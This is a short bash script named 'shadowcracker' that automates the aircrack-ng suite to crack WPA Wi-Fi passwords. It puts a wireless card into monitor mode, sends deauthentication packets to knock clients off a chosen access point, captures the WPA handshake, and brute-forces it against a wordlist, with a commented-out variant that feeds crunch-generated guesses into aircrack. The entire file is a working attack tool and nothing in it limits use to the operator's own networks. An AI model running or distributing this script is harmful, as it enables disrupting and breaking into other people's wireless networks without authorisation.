#!/bin/bash
########################
#    shadowcracker      #
#    made by dotwavD    #
########################

#github.com/coltodu123
#Contact NSA
#this is a autmated program for airmon and aircrack to bruteforce logins. 
#you can use crunch if you dont have a wordlist and if you have the semi password
#Mr. Robot for life

bssid=""
wpa=""
channel=""
destination=""
wordlist=""
interface=""
ddos=""
crunch=""
    cleanup() {
    airmon-ng stop $interface
    NetworkManager restart
    
    }
    aircrack() {
    echo "Enter the Wpa handshake."
    read wpa
    aircrack-ng -a2 -b $wpa -w $wordlist $destination
    #crunch 13 13 -f /usr/share/rainbowcrack/charset.txt alpha-numeric -t 3HW14%W@0%%%% | aircrack-ng -a2 -b $wpa -w - /root/Desktop/*.cap
    
    }
    airodump() {
    airodump-ng $interface
    echo "Enter the bssid:"
    read bssid
    echo "Enter the channel:"
    read channel
    clear
    echo "You need to wait for a wpa and copy it and enter in the terminal"
    echo "Being close to the internet helps for getting the wpa super fast."
    clear
    echo "Enter the ammout of packets you want to send,"
    read ddos
    sleep 4
    echo $ddos
    aireplay-ng --deauth $ddos -a $bssid $interface
    airodump-ng -c $channel --bssid $bssid -w $destination $interface
    }
    airmon() {
    echo "Welcome to the shadowcracker program"
    sleep 3
    airmon-ng check kill
    clear
    airmon-ng start $interface
    clear
    echo "Press Ctrl + c when done and remember the channel and copy the bssid"
    sleep 5
    
    }
    Information(){
    echo "Enter your interface:"
    read interface
    clear
    echo "Enter your wordlist:"
    read wordlist
    clear
    echo "Enter the destination you want your cap files to go to:"
    read destination
    }
Information
airmon
airodump
aircrack
cleanup







